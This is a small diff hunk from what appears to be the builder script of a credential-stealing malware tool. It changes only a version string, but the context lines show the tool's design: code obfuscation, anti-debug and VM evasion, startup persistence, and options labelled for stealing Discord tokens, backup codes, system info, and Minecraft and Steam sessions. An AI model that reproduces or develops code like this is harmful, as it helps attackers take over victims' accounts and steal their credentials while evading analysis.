@@ -25,7 +25,7 @@ from utils.module.logger import log_debug, timestamp, log_warn, log_error
 os.system("cls")
 obf = Obfuscators(include_imports=True, recursion=3)
 
-version = "v1.55.4"
+version = "v1.55.4-fix"
 CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup"]
 ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup"]
 PATH = "src/stealer_core/src.py"
